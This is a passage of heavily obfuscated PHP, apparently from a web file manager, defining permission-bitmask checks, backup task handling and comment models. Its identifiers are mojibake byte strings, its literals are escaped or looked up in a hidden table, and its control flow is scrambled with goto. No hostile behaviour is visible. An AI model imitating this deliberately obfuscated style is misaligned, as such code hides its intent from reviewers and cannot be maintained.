$eñÙ”ŠÊ§[1695] => $eñÙ”ŠÊ§[1707], $eñÙ”ŠÊ§[1697] => 5, $eñÙ”ŠÊ§[1698] => 1, $eñÙ”ŠÊ§[1699] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($eñÙ”ŠÊ§[422] => LNG($eñÙ”ŠÊ§[1708]), $eñÙ”ŠÊ§[1695] => $eñÙ”ŠÊ§[1709], $eñÙ”ŠÊ§[1697] => 6, $eñÙ”ŠÊ§[1698] => 1, $eñÙ”ŠÊ§[1699] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($eñÙ”ŠÊ§[422] => LNG($eñÙ”ŠÊ§[1710]), $eñÙ”ŠÊ§[1695] => $eñÙ”ŠÊ§[1711], $eñÙ”ŠÊ§[1697] => 7, $eñÙ”ŠÊ§[1698] => 1, $eñÙ”ŠÊ§[1699] => 0)); return $B„„ÊÜ–™¹; } public static function authCheck($AœË¥ğ£…„, $A›„Ÿ‹“‹») { $AœË¥ğ£…„ = intval($AœË¥ğ£…„); if ($GLOBALS[$_SERVER[«¾°Ã¤][494]]) { return !0; } if ($AœË¥ğ£…„ <= 0) { return !1; } if (($AœË¥ğ£…„ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($AœË¥ğ£…„ & $A›„Ÿ‹“‹»); } public static function authCheckShow($a¬ ¼èø¼Ê) { return self::authCheck($a¬ ¼èø¼Ê, self::AUTH_SHOW); } public static function authCheckView($F£·‚Œ‰¹î) { return self::authCheck($F£·‚Œ‰¹î, self::AUTH_VIEW); } public static function authCheckDownload($bêÅÛ«É¯’) { return self::authCheck($bêÅÛ«É¯’, self::AUTH_DOWNLOAD); } public static function authCheckUpload($Ağá‡£ºÖÌ) { return self::authCheck($Ağá‡£ºÖÌ, self::AUTH_UPLOAD); } public static function authCheckEdit($b™Á‚ßÁ†Û) { return self::authCheck($b™Á‚ßÁ†Û, self::AUTH_EDIT); } public static function authCheckRemove($A¼µÇùÄõà) { return self::authCheck($A¼µÇùÄõà, self::AUTH_REMOVE); } public static function authCheckShare($bä´É²½—) { return self::authCheck($bä´É²½—, self::AUTH_SHARE); } public static function authCheckComment($e¦‘¬‹İá®) { return self::authCheck($e¦‘¬‹İá®, self::AUTH_COMMENT); } public static function authCheckEvent($d¶¦µ¡†‘ã) { return self::authCheck($d¶¦µ¡†‘ã, self::AUTH_EVENT); } public static function authCheckRoot($ašŠç«ÅÖ—) { return self::authCheck($ašŠç«ÅÖ—, self::AUTH_ROOT); } public static function authCheckAction($a–ÌÉ±„ºÏ, $B³Ü‰½˜Ä) { goto C–ï¿ò§ôÉ; bÊ ¹°Ì¶ë: if (($a–ÌÉ±„ºÏ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($a–ÌÉ±„ºÏ & $Fóš›øæç); goto eé¸ì¦¬Ú„; C–ï¿ò§ôÉ: $d’”„Å¾¾Å =& $_SERVER[«¾°Ã¤]; $FùƒÆ©«© = array($d’”„Å¾¾Å[1712] => self::AUTH_VIEW, $d’”„Å¾¾Å[1095] => self::AUTH_DOWNLOAD, $d’”„Å¾¾Å[107] => self::AUTH_UPLOAD, $d’”„Å¾¾Å[1660] => self::AUTH_EDIT, $d’”„Å¾¾Å[1659] => self::AUTH_REMOVE, $d’”„Å¾¾Å[1670] => self::AUTH_SHARE, $d’”„Å¾¾Å[352] => self::AUTH_COMMENT, $d’”„Å¾¾Å[1518] => self::AUTH_EVENT, $d’”„Å¾¾Å[1713] => self::AUTH_ROOT); if (!isset($FùƒÆ©«©[$B³Ü‰½˜Ä])) { return; } goto bé ßœËÂ; bé ßœËÂ: $Fóš›øæç = $FùƒÆ©«©[$B³Ü‰½˜Ä]; $a–ÌÉ±„ºÏ = intval($a–ÌÉ±„ºÏ); if ($a–ÌÉ±„ºÏ <= 0) { return !1; } goto bÊ ¹°Ì¶ë; eé¸ì¦¬Ú„: } public static function authDisable($fÙôªÄÈÔ‹, $AèˆË†œİŠ) { if (intval($fÙôªÄÈÔ‹) <= 0) { return 0; } return intval($fÙôªÄÈÔ‹) & ~$AèˆË†œİŠ; } public $optionType = "\x53\171\x73\x74\145\x6d\x2e\x73\x6f\x75\162\143\145\x41\x75\x74\150\x4c\151\x73\x74"; public $field = array("\x6e\141\155\145", "\x61\165\164\x68", "\154\x61\x62\x65\154", "\x64\x69\x73\160\154\141\x79", "\163\x79\x73\x74\145\x6d", "\163\x6f\162\164"); public function initData() { $aóÆãäÈ‰Ø = $this->authDefault(); foreach ($aóÆãäÈ‰Ø as $bÓƒĞ¶) { $this->add($bÓƒĞ¶); } } public function listData($e³Ì°¸¦Òø = false, $D¶Ç©¥´ = "\163\x6f\162\164", $bàÇšß‰Å = false) { return parent::listData($e³Ì°¸¦Òø, $D¶Ç©¥´, $bàÇšß‰Å); } public function update($c‰¢ØŒÉöà, $c³ˆ´¹ĞË™) { $EŸ©µôá” =& $_SERVER[«¾°Ã¤]; $Cäƒ´îášî = parent::listData($c‰¢ØŒÉöà); $cƒÈèƒ×ãÍ = $this->findByName($c³ˆ´¹ĞË™[$EŸ©µôá”[28]]); if (!$Cäƒ´îášî || $cƒÈèƒ×ãÍ && $cƒÈèƒ×ãÍ[$EŸ©µôá”[393]] != $Cäƒ´îášî[$EŸ©µôá”[393]]) { return !1; } $this->filterAuth($c³ˆ´¹ĞË™[$EŸ©µôá”[415]]); return parent::update($c‰¢ØŒÉöà, $c³ˆ´¹ĞË™); } public function remove($b­•ŞÊã×) { $D›“©Íå‰À = parent::listData($b­•ŞÊã×); if (!$D›“©Íå‰À || $D›“©Íå‰À[$_SERVER[«¾°Ã¤][1172]]) { return !1; } return parent::remove($b­•ŞÊã×); } public function add($FÆ‹Ÿ¾™© = array()) { goto f°º»ˆèÆ‰; EÍ÷‘Ğá®: $FÆ‹Ÿ¾™© = array_merge($bÕ¡‡µõ¦³, $FÆ‹Ÿ¾™©); $FÆ‹Ÿ¾™©[$Béá©À§Øã[1716]] = $this->getSort(); $this->filterAuth($FÆ‹Ÿ¾™©[$Béá©À§Øã[415]]); goto fÆÉßÑ´˜; f°º»ˆèÆ‰: $Béá©À§Øã =& $_SERVER[«¾°Ã¤]; if ($this->findByName($FÆ‹Ÿ¾™©[$Béá©À§Øã[28]])) { return !1; } $bÕ¡‡µõ¦³ = array($Béá©À§Øã[28] => $Béá©À§Øã[33], $Béá©À§Øã[415] => 1, $Béá©À§Øã[1714] => $Béá©À§Øã[1703], $Béá©À§Øã[1715] => 1, $Béá©À§Øã[1172] => 0, $Béá©À§Øã[1716] => 0); goto EÍ÷‘Ğá®; fÆÉßÑ´˜: return parent::insert($FÆ‹Ÿ¾™©); goto b…¨äÄãñ; b…¨äÄãñ: } private function getSort() { $a½¶œùÕÑ =& $_SERVER[«¾°Ã¤]; $féî‚Èšè‡ = parent::listData(); $Eñ„—¤Ìç´ = array_to_keyvalue($féî‚Èšè‡, $a½¶œùÕÑ[33], $a½¶œùÕÑ[1716]); return empty($Eñ„—¤Ìç´) ? 0 : max($Eñ„—¤Ìç´) + 1; } private function filterAuth(&$fç¡ŞİÁÈğ) { goto A‰ì‘°Ø¢ª; e¨éÈÖ¦‡¾: foreach ($aŞƒ“‚Ğ as $b´†Ê‘›‰¢) { if (isset($D‹¤Ê‚Ø…Ÿ[$b´†Ê‘›‰¢])) { $aŞƒ“‚Ğ = array_merge($aŞƒ“‚Ğ, $D‹¤Ê‚Ø…Ÿ[$b´†Ê‘›‰¢]); } } $aŞƒ“‚Ğ[] = self::AUTH_SHOW; $fç¡ŞİÁÈğ = array_sum(array_unique($aŞƒ“‚Ğ)); goto c—Ü°±šß¾; A‰ì‘°Ø¢ª: if (!$fç¡ŞİÁÈğ) { return; } $AóÊêŠåë– = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $aŞƒ“‚Ğ = array(); goto eÂé¿´Ä½; eÂé¿´Ä½: foreach ($AóÊêŠåë– as $b´†Ê‘›‰¢) { if ($fç¡ŞİÁÈğ & $b´†Ê‘›‰¢) { $aŞƒ“‚Ğ[] = $b´†Ê‘›‰¢; } } if (in_array(self::AUTH_ROOT, $aŞƒ“‚Ğ)) { $fç¡ŞİÁÈğ = array_sum($AóÊêŠåë–); return; } $D‹¤Ê‚Ø…Ÿ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto e¨éÈÖ¦‡¾; c—Ü°±šß¾: } public function sort($B«¨¶ğÁß, $cñÕƒİ‡ Ñ) { return parent::update($B«¨¶ğÁß, $cñÕƒİ‡ Ñ); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\155\56\142\141\x63\153\165\x70\114\151\x73\x74"; public $field = array("\151\157", "\x6e\141\155\145", "\163\164\141\x74\165\x73", "\x63\157\x6e\164\145\156\164", "\155\x61\156\165\x61\x6c", "\162\x65\x73\165\x6c\x74", "\x74\x69\x6d\x65\106\162\157\x6d", "\x74\x69\155\145\x54\x6f"); public function config() { goto dÊ‰Ñ¥§×õ; bßùä·‚…Ò: Action($a§¦š•ÊÖ÷[1717])->taskInit(); Model($a§¦š•ÊÖ÷[1499])->cacheClear(); $d„¥Ä§‚ = $a§¦š•ÊÖ÷[1718]; goto aº‹ÔƒÑùê; c×˜™‰‚¤: $fŞ†¨æ ™é = is_array($fŞ†¨æ ™é) ? $fŞ†¨æ ™é : array(); if (!isset($fŞ†¨æ ™é[$a§¦š•ÊÖ÷[724]])) { $fŞ†¨æ ™é[$a§¦š•ÊÖ÷[724]] = $a§¦š•ÊÖ÷[87]; } unset($fŞ†¨æ ™é[$a§¦š•ÊÖ÷[1500]]); goto bßùä·‚…Ò; aº‹ÔƒÑùê: $c¹Ğ¹Ş¦µë = Model($a§¦š•ÊÖ÷[1719])->findByKey($a§¦š•ÊÖ÷[1518], $d„¥Ä§‚); if (!$c¹Ğ¹Ş¦µë) { $c¹Ğ¹Ş¦µë = array(); } if (isset($c¹Ğ¹Ş¦µë[$a§¦š•ÊÖ÷[197]])) { $c¹Ğ¹Ş¦µë[$a§¦š•ÊÖ÷[197]] = json_decode($c¹Ğ¹Ş¦µë[$a§¦š•ÊÖ÷[197]], !0); } goto cİ×ÑßÔŸ¨; cİ×ÑßÔŸ¨: if (isset($fŞ†¨æ ™é[$a§¦š•ÊÖ÷[197]])) { $c¹Ğ¹Ş¦µë[$a§¦š•ÊÖ÷[197]][$a§¦š•ÊÖ÷[1503]] = $fŞ†¨æ ™é[$a§¦š•ÊÖ÷[197]]; unset($fŞ†¨æ ™é[$a§¦š•ÊÖ÷[197]]); } return array_merge($c¹Ğ¹Ş¦µë, $fŞ†¨æ ™é); goto EÎîöÑ‚Ò–; dÊ‰Ñ¥§×õ: $a§¦š•ÊÖ÷ =& $_SERVER[«¾°Ã¤]; $fŞ†¨æ ™é = Model($a§¦š•ÊÖ÷[739])->get($a§¦š•ÊÖ÷[751]); $fŞ†¨æ ™é = json_decode($fŞ†¨æ ™é, !0); goto c×˜™‰‚¤; EÎîöÑ‚Ò–: } public function listData($E§ÛÒÜÈ†® = false, $C‘­Ô”ô® = "\x6d\157\144\151\x66\x79\124\x69\x6d\x65", $a¿‚ËŸééç = false) { return parent::listData($E§ÛÒÜÈ†®, $C‘­Ô”ô®, !0); } public function lastItem() { $c‹‹ç ›ƒ™ = $this->listData(); return !empty($c‹‹ç ›ƒ™[0]) ? $c‹‹ç ›ƒ™[0] : null; } public function kill($A¬±ã—‹Ÿª) { goto D«ÛÑÓ³´; C½¬àâ°İ: Task::kill($E”ê¨ê²£[750]); Task::kill($E”ê¨ê²£[773]); Task::kill($E”ê¨ê²£[783]); goto cÌ‘ØÎê”; D«ÛÑÓ³´: $E”ê¨ê²£ =& $_SERVER[«¾°Ã¤]; $D­½Îùàò = $this->listData($A¬±ã—‹Ÿª); if (!$D­½Îùàò || empty($D­½Îùàò[$E”ê¨ê²£[28]])) { return !0; } goto C½¬àâ°İ; a³¾š¾–õô: return $this->remove($A¬±ã—‹Ÿª); goto D‘¼ØâÍÏ; cÌ‘ØÎê”: $E‡¦¥¦ãÊ = $D­½Îùàò[$E”ê¨ê²£[28]]; $b½À®ÖäÁ = TEMP_FILES . $E”ê¨ê²£[747] . $E‡¦¥¦ãÊ . $E”ê¨ê²£[8]; IO::remove($b½À®ÖäÁ, !1); goto a³¾š¾–õô; D‘¼ØâÍÏ: } public function remove($C…ßÍç“„§) { $Eê¯í¥Š·ˆ = $this->listData($C…ßÍç“„§); if (!$Eê¯í¥Š·ˆ) { return !0; } return $this->backupRemove($Eê¯í¥Š·ˆ); } private function backupRemove($a÷„‹¿Ÿ­ ) { parent::remove($a÷„‹¿Ÿ­ [$_SERVER[«¾°Ã¤][393]]); $CÈ°·—©Ô = $this->backupPath($a÷„‹¿Ÿ­ ); IO::remove($CÈ°·—©Ô, !1); return !0; } private function backupPath($dòÇË·îÎ) { $BŞÇî¶’èí =& $_SERVER[«¾°Ã¤]; $cš˜“”—ë = $dòÇË·îÎ[$BŞÇî¶’èí[28]]; $EÛœ‹Ñí¯ğ = Model($BŞÇî¶’èí[739])->get($BŞÇî¶’èí[740]); $FÚùÌìœÎô = substr(md5($BŞÇî¶’èí[741] . $EÛœ‹Ñí¯ğ . $cš˜“”—ë), 0, 8); return "\173\151\157\72{$dòÇË·îÎ[$BŞÇî¶’èí[721]]}\175\x2f\144\x61\164\141\x62\x61\x73\145\x2f\142\141\x63\153\x75\x70\57" . $cš˜“”—ë . $BŞÇî¶’èí[71] . $FÚùÌìœÎô; } public function start() { goto d‰áé‚²ä‚; d‰áé‚²ä‚: $fÈÕ°ÈÚ¥Ğ =& $_SERVER[«¾°Ã¤]; if ($GLOBALS[$fÈÕ°ÈÚ¥Ğ[6]][$fÈÕ°ÈÚ¥Ğ[88]][$fÈÕ°ÈÚ¥Ğ[1720]] != $fÈÕ°ÈÚ¥Ğ[87]) { return !0; } $Aµà×âÃôä = $this->config(); goto EÊá˜•Šïœ; fÚâóÌ§Ë£: Backup::set(array($fÈÕ°ÈÚ¥Ğ[719] => 1, $fÈÕ°ÈÚ¥Ğ[485] => time())); return !0; goto CÈƒÃ·‚…ï; EÊá˜•Šïœ: if (!$Aµà×âÃôä || $Aµà×âÃôä[$fÈÕ°ÈÚ¥Ğ[1500]] != $fÈÕ°ÈÚ¥Ğ[87]) { return !1; } $d»È‡êåÃŸ = $this->process(); foreach ($d»È‡êåÃŸ as $Dº°ß¹”Ş) { if ($Dº°ß¹”Ş) { return Task::restart($Dº°ß¹”Ş[$fÈÕ°ÈÚ¥Ğ[393]]); } } goto aØ­àç‡«; aØ­àç‡«: $c½ª¬½ãÛ = new Backup(); $c¡ÂÂœãÒŸ = $c½ª¬½ãÛ->db(); if ($c¡ÂÂœãÒŸ) { $c¡ÂÂœãÒŸ = $c½ª¬½ãÛ->dbFile(); if ($c¡ÂÂœãÒŸ && $Aµà×âÃôä[$fÈÕ°ÈÚ¥Ğ[724]] == $fÈÕ°ÈÚ¥Ğ[191]) { $c¡ÂÂœãÒŸ = $c½ª¬½ãÛ->file(); } } goto fÚâóÌ§Ë£; CÈƒÃ·‚…ï: } public function process() { $b©ÓÖˆ‚ =& $_SERVER[«¾°Ã¤]; return array($b©ÓÖˆ‚[727] => Task::get($b©ÓÖˆ‚[750]), $b©ÓÖˆ‚[731] => Task::get($b©ÓÖˆ‚[773]), $b©ÓÖˆ‚[193] => Task::get($b©ÓÖˆ‚[783])); } public function restore() { $c»øÌÌ‘£” =& $_SERVER[«¾°Ã¤]; ActionCall($c»øÌÌ‘£”[1019], !0, 1); ActionCall($c»øÌÌ‘£”[1019], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\155\155\145\156\164"; protected $tableMeta = array("\164\x61\142\x6c\x65\x4e\x61\x6d\x65" => "\x63\157\x6d\x6d\x65\156\164\x5f\155\x65\164\x61", "\155\x65\164\141\106\x69\145\154\x64" => "\x63\x6f\155\155\x65\x6e\x74\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($a×æ„„¸à¿) { $AŸ×¿Î´òï =& $_SERVER[«¾°Ã¤]; if ($a×æ„„¸à¿[$AŸ×¿Î´òï[1721]]) { $F‹¹‘«‘ = $this->where(array($AŸ×¿Î´òï[1722] => $a×æ„„¸à¿[$AŸ×¿Î´òï[1721]]))->find(); if (!$F‹¹‘«‘ || $F‹¹‘«‘[$AŸ×¿Î´òï[413]] != $a×æ„„¸à¿[$AŸ×¿Î´òï[413]] || $F‹¹‘«‘[$AŸ×¿Î´òï[493]] != $a×æ„„¸à¿[$AŸ×¿Î´òï[493]]) { return !1; } $this->where(array($AŸ×¿Î´òï[1722] => $a×æ„„¸à¿[$AŸ×¿Î´òï[1721]]))->setAdd($AŸ×¿Î´òï[1723], 1); } $a×æ„„¸à¿[$AŸ×¿Î´òï[1724]] = 0; $a×æ„„¸à¿[$AŸ×¿Î´òï[1723]] = 0; $a×æ„„¸à¿[$AŸ×¿Î´òï[719]] = 1; return $this->add($a×æ„„¸à¿); } public function commentCount($Få«Ô—áßª, $B«èİ×Ñé) { goto f¹†„àŠˆà; C—ÉëÔò‰„: $CÕÁæ½Ä½ö = array($DÅˆ‹±æ°İ[493], $DÅˆ‹±æ°İ[1725] => $DÅˆ‹±æ°İ[489]); $C¬‹Û´ = array($DÅˆ‹±æ°İ[493] => array($DÅˆ‹±æ°İ[7], $Få«Ô—áßª), $DÅˆ‹±æ°İ[413] => $B«èİ×Ñé); $A¡‚æîäĞ = $this->field($CÕÁæ½Ä½ö)->where($C¬‹Û´)->group($DÅˆ‹±æ°İ[493])->select(); goto cš‡¡Ë“…¡; f¹†„àŠˆà: $DÅˆ‹±æ°İ =& $_SERVER[«¾°Ã¤]; if (!$Få«Ô—áßª) { return array(); } if (is_string($Få«Ô—áßª) || is_int($Få«Ô—áßª)) { $Få«Ô—áßª = array($Få«Ô—áßª); } goto C—ÉëÔò‰„; cš‡¡Ë“…¡: return array_to_keyvalue($A¡‚æîäĞ, $DÅˆ‹±æ°İ[493], $DÅˆ‹±æ°İ[489]); goto e¯‘§­¡Ç¦; e¯‘§­¡Ç¦: } public function remove($AœÃ„ù­éÛ) { $F·ŞöæôÄí =& $_SERVER[«¾°Ã¤]; $C‘–³°¬ñÉ = array($F·ŞöæôÄí[1722] => $AœÃ„ù­éÛ); $FöìØ±Ã = $this->where($C‘–³°¬ñÉ)->find(); if ($FöìØ±Ã[$F·ŞöæôÄí[1721]]) { $this->where(array($F·ŞöæôÄí[1722] => $FöìØ±Ã[$F·ŞöæôÄí[1721]]))->setAdd($F·ŞöæôÄí[1723], -1); } return $this->where($C‘–³°¬ñÉ)->delete(); } public function edit($dë‡­ïì¸¿, $b®¸Ğ»ÎÜ) { $a¿à£÷É„Œ =& $_SERVER[«¾°Ã¤]; $aÙº®ÇˆÔ‹ = array($a¿à£÷É„Œ[1722] => $dë‡­ïì¸¿); return $this->where($aÙº®ÇˆÔ‹)->save(array($a¿à£÷É„Œ[1726] => $b®¸Ğ»ÎÜ)); } public function prasise($eáÖ—óİÓÀ) { $Aã¸‰Óáíº =& $_SERVER[«¾°Ã¤]; $FÕöÌêÙë = Model($Aã¸‰Óáíº[1727]); $B¶íåÍ â = array($Aã¸‰Óáíº[1722] => $eáÖ—óİÓÀ, $Aã¸‰Óáíº[1521] => USER_ID); $BÙ§ô»Í…º = $FÕöÌêÙë->where($B¶íåÍ â)->find(); if (!$BÙ§ô»Í…º) { $FÕöÌêÙë->add($B¶íåÍ â); $C…Ù´Œ‡ë = $this->where(array($Aã¸‰Óáíº[1722] => $eáÖ—óİÓÀ))->setAdd($Aã¸‰Óáíº[1724], 1); } else { $FÕöÌêÙë->where($B¶íåÍ â)->delete(); $C…Ù´Œ‡ë = $this->where(array($Aã¸‰Óáíº[1722] => $eáÖ—óİÓÀ))->setAdd($Aã¸‰Óáíº[1724], -1); } return $C…Ù´Œ‡ë; } public function targetInfo($F£ ³„×, $a §¿‚§) { goto B«ù‡ªÔÉ; B«ù‡ªÔÉ: $F‚•ØöÆ¨ƒ =& $_SERVER[«¾°Ã¤]; $A‡¸˜†Îœ½ = array($F‚•ØöÆ¨ƒ[558] => $F£ ³„×, $F‚•ØöÆ¨ƒ[559] => $a §¿‚§); $f˜ŠÁ±òÚ = $this->where($A‡¸˜†Îœ½)->count(); goto eˆ‘ŞÛ †; cƒ×ÙãØ£: return $eä’İ‚ÊÁ; goto fç™çãÃ°…; eˆ‘ŞÛ †: $eŞšÍßÒ = "\122\111\x47\110\124\x20\112\x4f\x49\116\40{$this->tablePrefix}\x63\157\155\155\145\x6e\x74\x5f\160\162\x61\151\163\x65\40\163\x74\141\x72\x20\157\x6e\x20\x63\157\155\x6d\145\156\164\56\143\x6f\155\x6d\x65\x6e\x74\111\x44\x20\x3d\x20\x73\164\141\x72\x2e\x63\157\155\x6d\x65\x6e\x74\111\104"; $aƒ«äËæØ = $this->alias($F‚•ØöÆ¨ƒ[352])->where($A‡¸˜†Îœ½)->join($eŞšÍßÒ, $F‚•ØöÆ¨ƒ[1728])->count(); $eä’İ‚ÊÁ = array($F‚•ØöÆ¨ƒ[1729] => $f˜ŠÁ±òÚ, $F‚•ØöÆ¨ƒ[1730] => $aƒ«äËæØ); goto cƒ×ÙãØ£; fç™çãÃ°…: } public function listData($bÃºÓö¿ñò) { $Bƒ—¶Ÿ¸¹´ =& $_SERVER[«¾°Ã¤]; if (isset($bÃºÓö¿ñò[$Bƒ—¶Ÿ¸¹´[1731]])) { if ($bÃºÓö¿ñò[$Bƒ—¶Ÿ¸¹´[1731]]) { $bÃºÓö¿ñò[$Bƒ—¶Ÿ¸¹´[1732]] = array($Bƒ—¶Ÿ¸¹´[972], intval($bÃºÓö¿ñò[$Bƒ—¶Ÿ¸¹´[1731]])); } unset($bÃºÓö¿ñò[$Bƒ—¶Ÿ¸¹´[1731]]); } if (isset($bÃºÓö¿ñò[$Bƒ—¶Ÿ¸¹´[1733]])) { if ($bÃºÓö¿ñò[$Bƒ—¶Ÿ¸¹´[1733]]) { $bÃºÓö¿ñò[$Bƒ—¶Ÿ¸¹´[1732]] = array($Bƒ—¶Ÿ¸¹´[969], intval($bÃºÓö¿ñò[$Bƒ—¶Ÿ¸¹´[1733]])); } unset($bÃºÓö¿ñò[$Bƒ—¶Ÿ¸¹´[1733]]); } return $this->_listData($bÃºÓö¿ñò); } private function _listData($c¿¦Æ®Ú) { $BÚ—ÎÉç · =& $_SERVER[«¾°Ã¤]; $A¨»İ£‹Š‹ = $this->where($c¿¦Æ®Ú)->_makeOrder()->selectPage(100); $this->_listAppendParent($A¨»İ£‹Š‹[$BÚ—ÎÉç ·[367]]); $this->_listAppendUser($A¨»İ£‹Š‹[$BÚ—ÎÉç ·[367]]); $this->_listAppendMeta($A¨»İ£‹Š‹[$BÚ—ÎÉç ·[367]]); return $A¨»İ£‹Š‹; } private function _makeOrder() { $eŠ§°½Ñğ‰ =& $_SERVER[«¾°Ã¤]; $F±…Ø‚”Í‚ = array($eŠ§°½Ñğ‰[1724], $eŠ§°½Ñğ‰[1723], $eŠ§°½Ñğ‰[194]); $bª‰ó¢ÕÛÕ = Input::get($eŠ§°½Ñğ‰[444], $eŠ§°½Ñğ‰[7], $eŠ§°½Ñğ‰[425], $F±…Ø‚”Í‚); $fëéˆì = Input::get($eŠ§°½Ñğ‰[445], $eŠ§°½Ñğ‰[7], $eŠ§°½Ñğ‰[1523], array($eŠ§°½Ñğ‰[1734], $eŠ§°½Ñğ‰[440])); $FºĞ‰´ä¹ª = $bª‰ó¢ÕÛÕ . $eŠ§°½Ñğ‰[50] . $fëéˆì; return $this->order($FºĞ‰´ä¹ª); } private function _listAppendParent(&$DøÍŒë²‰Û) { goto dí˜ùç…•; aÄ…¶«è„: foreach ($DøÍŒë²‰Û as &$aéÁ÷¨Üª) { if (isset($dÌîë¬Äñã[$aéÁ÷¨Üª[$BÆ‰ï³Ò[1721]]])) { $aéÁ÷¨Üª[$BÆ‰ï³Ò[1735]] = $dÌîë¬Äñã[$aéÁ÷¨Üª[$BÆ‰ï³Ò[1721]]]; } } unset($aéÁ÷¨Üª); goto C—˜˜Á·ŠÑ; F‚ùÁ¯ÈÙì: if (!$bÂ‚¡äË†Å) { return; } $dÌîë¬Äñã = $this->where(array($BÆ‰ï³Ò[1722] => array($BÆ‰ï³Ò[7], $bÂ‚¡äË†Å)))->select(); $dÌîë¬Äñã = array_to_keyvalue($dÌîë¬Äñã, $BÆ‰ï³Ò[1732]); goto aÄ…¶«è„; dí˜ùç…•: $BÆ‰ï³Ò =& $_SERVER[«¾°Ã¤]; $bÂ‚¡äË†Å = array_unique(array_to_keyvalue($DøÍŒë²‰Û, $BÆ‰ï³Ò[33], $BÆ‰ï³Ò[1721])); $bÂ‚¡äË†Å = array_remove_value($bÂ‚¡äË†Å, $BÆ‰ï³Ò[191]); goto F‚ùÁ¯ÈÙì; C—˜˜Á·ŠÑ: } private function _listAppendUser(&$AÙ¦›´ø) { goto AŠÂƒì®•°; CÂ¸ÓŞ²¦ñ: if (count($Fé‰»è’Å®) == 0) { return; } foreach ($AÙ¦›´ø as $B†Ô¯ÆÂ†) { if (isset($B†Ô¯ÆÂ†[$d¼×È•ä¦¨[1735]])) { $Fé‰»è’Å®[] = $B†Ô¯ÆÂ†[$d¼×È•ä¦¨[1735]][$d¼×È•ä¦¨[1529]]; } } $bÍß›—Ë‹ = Model($d¼×È•ä¦¨[515])->userListInfo($Fé‰»è’Å®); goto C¯ˆ‚ˆå—Ş; AŠÂƒì®•°: $d¼×È•ä¦¨ =& $_SERVER[«¾°Ã¤]; $Fé‰»è’Å® = array_unique(array_to_keyvalue($AÙ¦›´ø, $d¼×È•ä¦¨[33], $d¼×È•ä¦¨[1529])); $Fé‰»è’Å® = array_remove_value($Fé‰»è’Å®, $d¼×È•ä¦¨[191]); goto CÂ¸ÓŞ²¦ñ; C¯ˆ‚ˆå—Ş: foreach ($AÙ¦›´ø as &$B†Ô¯ÆÂ†) { $B†Ô¯ÆÂ†[$d¼×È•ä¦¨[571]] = $bÍß›—Ë‹[$B†Ô¯ÆÂ†[$d¼×È•ä¦¨[1529]]]; if (isset($B†Ô¯ÆÂ†[$d¼×È•ä¦¨[1735]])) { $B†Ô¯ÆÂ†[$d¼×È•ä¦¨[1735]][$d¼×È•ä¦¨[571]] = $bÍß›—Ë‹[$B†Ô¯ÆÂ†[$d¼×È•ä¦¨[1735]][$d¼×È•ä¦¨[1529]]]; } } unset($B†Ô¯ÆÂ†); goto bƒÃ¼ªÛÚ³; bƒÃ¼ªÛÚ³: } private function _listAppendMeta(&$B°—âÙ‰ãÖ) { goto B·ØÉôã­ ; B·ØÉôã­ : $a¿òƒªìèÓ =& $_SERVER[«¾°Ã¤]; $A‡ˆšö‘† = array_unique(array_to_keyvalue($B°—âÙ‰ãÖ, $a¿òƒªìèÓ[33], $a¿òƒªìèÓ[1732])); $A‡ˆšö‘† = array_remove_value($A‡ˆšö‘†, $a¿òƒªìèÓ[191]); goto E’µ³İš; E’µ³İš: if (!$A‡ˆšö‘†) { return; } foreach ($B°—âÙ‰ãÖ as $dƒˆ¥œÍ½à) { if (isset($dƒˆ¥œÍ½à[$a¿òƒªìèÓ[1735]])) { $A‡ˆšö‘†[] = $dƒˆ¥œÍ½à[$a¿òƒªìèÓ[1735]][$a¿òƒªìèÓ[1732]]; } } $C§‘ÛóğŠ = $this->metaList($A‡ˆšö‘†); goto bÜ…—­„œ”; bÜ…—­„œ”: if (!$C§‘ÛóğŠ) { return !1; } foreach ($B°—âÙ‰ãÖ as &$dƒˆ¥œÍ½à) { $dƒˆ¥œÍ½à[$a¿òƒªìèÓ[454]] = $C§‘ÛóğŠ[$dƒˆ¥œÍ½à[$a¿òƒªìèÓ[1732]]]; if (isset($dƒˆ¥œÍ½à[$a¿òƒªìèÓ[1735]])) { $dƒˆ¥œÍ½à[$a¿òƒªìèÓ[1735]][$a¿òƒªìèÓ[454]] = $C§‘ÛóğŠ[$dƒˆ¥œÍ½à[$a¿òƒªìèÓ[1735]][$a¿òƒªìèÓ[1732]]]; } } unset($dƒˆ¥œÍ½à); goto AÔ£—¹ÍÀ‰; AÔ£—¹ÍÀ‰: } private function metaList($A†İîæİ»Æ) { goto DøŠîô­‘; döèÌ¶µŸÉ: return $f‰ËÔßµ³æ ? $f‰ËÔßµ³æ : array(); goto AÔ£¼Ò˜Í; DøŠîô­‘: $Dš×ª‰×¾Í =& $_SERVER[«¾°Ã¤]; if (!$A†İîæİ»Æ) { return array(); } $D´àºµ®Íª = array($Dš×ª‰×¾Í[1732] => array($Dš×ª‰×¾Í[7], $A†İîæİ»Æ)); goto BÔÜÄÀìšò; BÔÜÄÀìšò: $f‰ËÔßµ³æ = Model($Dš×ª‰×¾Í[1736])->where($D´àºµ®Íª)->select(); $f‰ËÔßµ³æ = 